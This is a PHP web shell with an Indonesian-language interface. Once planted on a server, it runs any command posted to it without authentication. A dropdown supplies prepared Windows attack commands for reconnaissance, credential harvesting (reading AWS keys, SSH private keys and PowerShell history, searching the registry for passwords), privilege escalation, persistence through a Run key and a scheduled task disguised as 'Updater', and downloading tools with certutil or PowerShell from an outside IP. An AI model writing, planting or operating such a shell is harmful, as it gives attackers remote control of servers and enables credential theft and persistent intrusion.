<?php
session_start();

$is_win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');

if (!isset($_SESSION['cwd']))     $_SESSION['cwd'] = getcwd();
if (!isset($_SESSION['history'])) $_SESSION['history'] = [];

$cwd = $_SESSION['cwd'];
$cmd = '';
$out = '';

// ── Eksekusi ─────────────────────────────────────────────
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['cmd'])) {
    $cmd = trim($_POST['cmd']);
    $_SESSION['history'][] = $cmd;
    if (count($_SESSION['history']) > 100) {
        $_SESSION['history'] = array_slice($_SESSION['history'], -100);
    }

    // built-in: cd
    if (preg_match('/^cd(?:\s+(.+))?$/i', $cmd, $m)) {
        $target = isset($m[1]) ? trim($m[1], " \t\"'") : '';
        if ($target === '' || $target === '~') {
            $target = $is_win ? getenv('USERPROFILE') : getenv('HOME');
        }
        if ($target !== '' && !preg_match('/^([A-Za-z]:|\/|\\\\)/', $target)) {
            $target = $cwd . DIRECTORY_SEPARATOR . $target;
        }
        $real = @realpath($target);
        if ($real && is_dir($real)) {
            $_SESSION['cwd'] = $real;
            $cwd = $real;
            $out = "[cd] -> $real";
        } else {
            $out = "[cd] Direktori tidak ditemukan: $target";
        }
    } else {
        // perintah eksternal
        $desc = [0 => ['pipe','r'], 1 => ['pipe','w'], 2 => ['pipe','w']];
        $proc = $is_win
            ? @proc_open('cmd.exe /c ' . $cmd, $desc, $pipes, $cwd)
            : @proc_open(['/bin/sh', '-c', $cmd], $desc, $pipes, $cwd);

        if (is_resource($proc)) {
            fclose($pipes[0]);
            $stdout = stream_get_contents($pipes[1]);
            $stderr = stream_get_contents($pipes[2]);
            fclose($pipes[1]); fclose($pipes[2]);
            proc_close($proc);

            $out = $stdout;
            if (trim($stderr) !== '') {
                $out .= ($out !== '' ? "\n" : '') . $stderr;
            }
            if (trim($out) === '') $out = '(tidak ada output)';
        } else {
            $out = '[error] gagal eksekusi';
        }
    }
}

function e($s) { return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }

// Info user
if (function_exists('posix_getpwuid') && function_exists('posix_geteuid')) {
    $u = posix_getpwuid(posix_geteuid());
    $user = $u['name'] ?? 'unknown';
} else {
    $user = getenv('USERNAME') ?: 'unknown';
}
$host = gethostname() ?: 'unknown';

// ── Daftar command untuk dropdown ─────────────────────────
$command_groups = [
    '1. System Recon' => [
        'whoami /all'                => 'whoami /all',
        'hostname'                   => 'hostname',
        'systeminfo'                 => 'systeminfo',
        'ipconfig /all'              => 'ipconfig /all',
        'route print'                => 'route print',
        'tasklist /v'                => 'tasklist /v',
        'wmic qfe get HotFixID'      => 'wmic qfe get HotFixID',
        'wmic product get name,version' => 'wmic product get name,version',
        'wmic service list brief'    => 'wmic service list brief',
        'sc query state= all'        => 'sc query state= all',
    ],
    '2. User & Group Enum' => [
        'net user'                                => 'net user',
        'net localgroup administrators'           => 'net localgroup administrators',
        'net share'                               => 'net share',
        'net session'                             => 'net session',
        'whoami /priv'                            => 'whoami /priv',
        'whoami /groups'                          => 'whoami /groups',
    ],
    '3. Registry & Autorun' => [
        'reg query HKLM\\...\\Run'  => 'reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
        'reg query HKCU\\...\\Run'  => 'reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
    ],
    '4. Credential Harvesting' => [
        'type %USERPROFILE%\\.aws\\credentials'                     => 'type %USERPROFILE%\\.aws\\credentials',
        'type %USERPROFILE%\\.ssh\\id_rsa'                          => 'type %USERPROFILE%\\.ssh\\id_rsa',
        'type ConsoleHost_history.txt'                              => 'type %USERPROFILE%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt',
        'reg query HKLM /f password /t REG_SZ /s'                   => 'reg query HKLM /f password /t REG_SZ /s',
        'reg query HKCU /f password /t REG_SZ /s'                   => 'reg query HKCU /f password /t REG_SZ /s',
        'findstr /S /I /M "password" *.*'                           => 'findstr /S /I /M "password" *.*',
        'cmdkey /list'                                              => 'cmdkey /list',
        'dir /s /b C:\\Users\\*pass* 2>nul'                         => 'dir /s /b C:\\Users\\*pass* 2>nul',
        'dir /s /b C:\\Users\\*cred* 2>nul'                         => 'dir /s /b C:\\Users\\*cred* 2>nul',
    ],
    '5. Privilege Escalation' => [
        'Get-Service (PowerShell)'      => 'powershell -c "Get-Service | Where-Object {$_.Status -eq \'Running\'}"',
        'schtasks /query /fo LIST /v'   => 'schtasks /query /fo LIST /v',
        'Get-ChildItem Program Files'   => 'powershell -c "Get-ChildItem \'C:\\Program Files\' -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.Name -match \'conf|config|pass\'}"',
    ],
    '6. Persistence' => [
        'Add Run key (HKCU Updater)'    => 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /t REG_SZ /d "C:\\Users\\Public\\shell.exe"',
        'Create schtask (Updater)'      => 'schtasks /create /sc minute /mo 5 /tn "Updater" /tr "C:\\Users\\Public\\shell.exe"',
    ],
    '7. File Transfer (Ganti IP!)' => [
        'certutil download'             => 'certutil -urlcache -f http://10.0.0.1/tool.exe C:\\Users\\Public\\tool.exe',
        'PowerShell IWR download'       => 'powershell -c "IWR http://10.0.0.1/f -OutFile C:\\Users\\Public\\f"',
    ],
];
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Shell — <?php echo e($host); ?></title>
<style>
    :root {
        --bg: #0f172a;
        --bg2: #1e293b;
        --cy: #22d3ee;
        --gr: #10b981;
        --rd: #ef4444;
        --am: #f59e0b;
        --tx: #f1f5f9;
        --mu: #64748b;
        --bd: #475569;
    }
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
        font-family: 'Segoe UI', system-ui, sans-serif;
        background: var(--bg);
        background-image: radial-gradient(ellipse at 30% 0%, rgba(34,211,238,.08), transparent 60%);
        color: var(--tx);
        min-height: 100vh;
        display: flex;
        justify-content: center;
        padding: 16px;
    }
    .wrap { width: 100%; max-width: 960px; display: flex; flex-direction: column; gap: 12px; }

    /* Header */
    .hd {
        display: flex; align-items: center; gap: 14px;
        background: var(--bg2);
        border: 1px solid var(--bd);
        border-radius: 12px;
        padding: 14px 18px;
        position: relative; overflow: hidden;
    }
    .hd::before {
        content:''; position:absolute; top:0; left:0; right:0; height:2px;
        background: linear-gradient(90deg, transparent, var(--cy), transparent);
    }
    .hd .ico {
        width: 40px; height: 40px; border-radius: 50%;
        display: flex; align-items: center; justify-content: center;
        background: rgba(34,211,238,.12);
        border: 1px solid rgba(34,211,238,.35);
        color: var(--cy); font-size: 18px; font-weight: bold;
        box-shadow: 0 0 16px rgba(34,211,238,.25);
    }
    .hd h1 { font-size: .95rem; font-weight: 600; }
    .hd h1 .u { color: var(--cy); }
    .hd h1 .h { color: var(--gr); }
    .hd p  { font-size: .72rem; color: var(--mu); margin-top: 2px; }

    /* Terminal */
    .term {
        background: #0a0f1c;
        border: 1px solid var(--bd);
        border-radius: 12px;
        overflow: hidden;
        flex: 1;
        display: flex;
        flex-direction: column;
        box-shadow: 0 20px 60px rgba(0,0,0,.5), 0 0 60px rgba(34,211,238,.04);
    }
    .bar {
        display: flex; align-items: center; gap: 7px;
        padding: 9px 14px;
        background: #131c2e;
        border-bottom: 1px solid var(--bd);
    }
    .bar .d { width: 10px; height: 10px; border-radius: 50%; }
    .bar .r { background: #ff5f56; }
    .bar .y { background: #ffbd2e; }
    .bar .g { background: #27c93f; }
    .bar .t { margin-left: 10px; font-size: .72rem; color: var(--mu); font-family: monospace; }
    .bar .p {
        margin-left: auto;
        font-family: monospace; font-size: .72rem;
        color: var(--cy);
        background: rgba(34,211,238,.08);
        border: 1px solid rgba(34,211,238,.2);
        padding: 2px 8px; border-radius: 5px;
        max-width: 55%; overflow: hidden;
        white-space: nowrap; text-overflow: ellipsis;
    }

    .body {
        flex: 1;
        padding: 16px;
        font-family: monospace;
        font-size: .85rem;
        line-height: 1.55;
        overflow-y: auto;
        white-space: pre-wrap;
        word-break: break-word;
        color: #cbd5e1;
        min-height: 380px;
        max-height: 60vh;
    }
    .body::-webkit-scrollbar { width: 8px; }
    .body::-webkit-scrollbar-thumb { background: rgba(71,85,105,.6); border-radius: 6px; }
    .body::-webkit-scrollbar-thumb:hover { background: var(--cy); }

    .welcome { color: var(--mu); font-size: .78rem; border-bottom: 1px dashed rgba(71,85,105,.5); padding-bottom: 10px; margin-bottom: 10px; }
    .welcome b { color: var(--cy); }

    .p-line { color: var(--gr); font-weight: bold; }
    .p-line .pd { color: var(--cy); }
    .p-line .c  { color: #e2e8f0; font-weight: normal; }

    .o-line { color: #cbd5e1; }

    /* ── Dropdown command picker ── */
    .cmd-picker {
        display: flex; align-items: center; gap: 10px;
        padding: 10px 14px;
        background: linear-gradient(180deg, #182238, #131c2e);
        border-top: 1px solid var(--bd);
        flex-wrap: wrap;
    }
    .cmd-picker .lbl {
        font-size: .74rem;
        text-transform: uppercase;
        letter-spacing: .08em;
        color: var(--am);
        font-weight: 700;
        display: flex; align-items: center; gap: 6px;
        white-space: nowrap;
    }
    .cmd-picker .lbl::before {
        content:'';
        display: inline-block;
        width: 8px; height: 8px;
        background: var(--am);
        border-radius: 50%;
        box-shadow: 0 0 8px var(--am);
    }
    .cmd-picker select {
        flex: 1;
        min-width: 240px;
        background: rgba(15,23,42,.9);
        border: 1px solid rgba(245,158,11,.4);
        border-radius: 7px;
        padding: 9px 12px;
        color: #fcd34d;
        font-family: monospace;
        font-size: .82rem;
        outline: none;
        cursor: pointer;
        transition: all .2s;
        appearance: none;
        background-image: url("data:image/svg+xml;charset=US-ASCII,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%23f59e0b' stroke-width='3' stroke-linecap='round' stroke-linejoin='round'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
        background-repeat: no-repeat;
        background-position: right 12px center;
        padding-right: 34px;
    }
    .cmd-picker select:focus {
        border-color: var(--am);
        box-shadow: 0 0 0 3px rgba(245,158,11,.15);
    }
    .cmd-picker select option,
    .cmd-picker select optgroup {
        background: #1e293b;
        color: #e2e8f0;
        padding: 4px;
    }
    .cmd-picker select optgroup {
        color: var(--am);
        font-weight: 700;
        background: #0f172a;
    }

    /* Input */
    .in {
        display: flex; align-items: center; gap: 8px;
        padding: 10px 14px;
        background: #0d1526;
        border-top: 1px solid var(--bd);
    }
    .in .pf {
        font-family: monospace; font-size: .9rem; font-weight: bold;
        color: var(--gr); white-space: nowrap;
    }
    .in .pf .pd { color: var(--cy); }
    .in input {
        flex: 1;
        background: rgba(15,23,42,.85);
        border: 1px solid rgba(34,211,238,.25);
        border-radius: 7px;
        padding: 10px 12px;
        color: #e2e8f0;
        font-family: monospace; font-size: .9rem;
        outline: none; transition: all .2s;
    }
    .in input:focus {
        border-color: var(--cy);
        box-shadow: 0 0 0 3px rgba(34,211,238,.12);
    }
    .in button {
        padding: 10px 18px;
        background: linear-gradient(135deg, var(--cy), #3b82f6);
        border: none; border-radius: 7px;
        color: #0f172a;
        font-weight: 700; font-size: .82rem;
        cursor: pointer; transition: all .2s;
        box-shadow: 0 4px 16px rgba(34,211,238,.25);
    }
    .in button:hover { transform: translateY(-1px); box-shadow: 0 6px 22px rgba(34,211,238,.4); }

    .note {
        text-align: center; font-size: .7rem; color: var(--mu);
        padding: 4px 0;
    }
    .note .w { color: var(--am); }

    @media (max-width: 600px) {
        .hd h1 { font-size: .85rem; }
        .body { font-size: .78rem; padding: 12px; min-height: 300px; }
        .in { flex-wrap: wrap; }
        .in .pf { font-size: .78rem; }
        .in button { width: 100%; }
        .cmd-picker select { min-width: 100%; }
    }
</style>
</head>
<body>
<div class="wrap">

    <div class="hd">
        <div class="ico">&#62;_</div>
        <div>
            <h1><span class="u"><?php echo e($user); ?></span>@<span class="h"><?php echo e($host); ?></span></h1>
            <p><?php echo e(PHP_OS); ?> &middot; PHP <?php echo e(PHP_VERSION); ?></p>
        </div>
    </div>

    <div class="term">
        <div class="bar">
            <span class="d r"></span>
            <span class="d y"></span>
            <span class="d g"></span>
            <span class="t">interactive shell</span>
            <span class="p" title="<?php echo e($cwd); ?>"><?php echo e($cwd); ?></span>
        </div>

        <div class="body" id="body">
            <div class="welcome">
                Ketik perintah di bawah, tekan <b>Enter</b> untuk menjalankan.<br>
                Gunakan <b>&#8593;</b>/<b>&#8595;</b> untuk riwayat. Perintah <b>cd</b> didukung &amp; tersimpan di sesi.<br>
                Atau pilih perintah siap pakai dari <b>dropdown</b> di bawah.
            </div>

            <?php if ($cmd !== ''): ?>
                <div class="p-line">
                    <?php echo e($user); ?>@<?php echo e($host); ?>:<span class="pd"><?php echo e($cwd); ?></span>$ <span class="c"><?php echo e($cmd); ?></span>
                </div>
                <div class="o-line"><?php echo e($out); ?></div>
            <?php endif; ?>
        </div>

        <!-- Dropdown perintah siap pakai -->
        <div class="cmd-picker">
            <span class="lbl">Command</span>
            <select id="cmdPicker">
                <option value="">— Pilih perintah siap pakai —</option>
                <?php foreach ($command_groups as $group => $items): ?>
                    <optgroup label="<?php echo e($group); ?>">
                        <?php foreach ($items as $label => $actual): ?>
                            <option value="<?php echo e($actual); ?>"><?php echo e($label); ?></option>
                        <?php endforeach; ?>
                    </optgroup>
                <?php endforeach; ?>
            </select>
        </div>

        <form method="POST" autocomplete="off" id="f">
            <div class="in">
                <span class="pf">
                    <?php echo e($user); ?>@<?php echo e($host); ?>:<span class="pd"><?php echo e($cwd); ?></span>$
                </span>
                <input type="text" name="cmd" id="cmd" placeholder="ketik perintah..." autofocus autocomplete="off" spellcheck="false">
                <button type="submit">Jalankan</button>
            </div>
        </form>
    </div>

    <div class="note"><span class="w">&#9888;</span> Tidak ada koneksi keluar. Eksekusi via HTTP lokal.</div>
</div>

<script>
(function () {
    const body   = document.getElementById('body');
    const cmd    = document.getElementById('cmd');
    const picker = document.getElementById('cmdPicker');
    const hist   = <?php echo json_encode(array_values($_SESSION['history'] ?? [])); ?>;
    let hi = hist.length;

    body.scrollTop = body.scrollHeight;
    cmd.focus();
    body.addEventListener('click', () => cmd.focus());

    // ── Riwayat panah atas/bawah ──
    cmd.addEventListener('keydown', e => {
        if (e.key === 'ArrowUp' && hi > 0) {
            e.preventDefault();
            hi--;
            cmd.value = hist[hi] || '';
            setTimeout(() => cmd.setSelectionRange(cmd.value.length, cmd.value.length), 0);
        } else if (e.key === 'ArrowDown') {
            e.preventDefault();
            if (hi < hist.length - 1) { hi++; cmd.value = hist[hi] || ''; }
            else { hi = hist.length; cmd.value = ''; }
        }
    });

    // ── Dropdown handler ──
    picker.addEventListener('change', function () {
        if (picker.value) {
            cmd.value = picker.value;
            cmd.focus();
            // Set kursor di akhir
            setTimeout(() => cmd.setSelectionRange(cmd.value.length, cmd.value.length), 0);
            // Reset dropdown kembali ke placeholder (opsional, agar bisa pilih ulang yg sama)
            // picker.selectedIndex = 0;
        }
    });
})();
</script>
</body>
</html>